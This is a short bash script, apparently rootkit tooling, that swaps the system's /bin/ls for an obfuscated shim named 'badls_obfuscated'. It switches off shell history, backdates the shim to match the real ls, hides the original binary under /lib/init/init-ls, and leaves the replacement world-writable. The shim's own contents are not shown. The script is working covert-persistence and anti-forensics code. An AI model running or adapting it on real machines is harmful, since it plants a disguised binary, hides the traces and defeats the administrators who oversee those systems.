# !/bin/bash
: <<'END'
A simple script that replaces the original ls binary with a shim


END

# Make sure only root can run our script
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi


# disable bash history
set +o history

LS=/bin/ls
SHIM=./badls_obfuscated
BK=/lib/init/init-ls

# change shim modification date to ls last modification date
touch -r $LS $SHIM

# move ls binary
mv -f $LS $BK

# replace it with my shim
mv -f $SHIM $LS

# Set root as the owner
chown root:root $LS
chmod 777 $LS


# enable bash history
set -o history
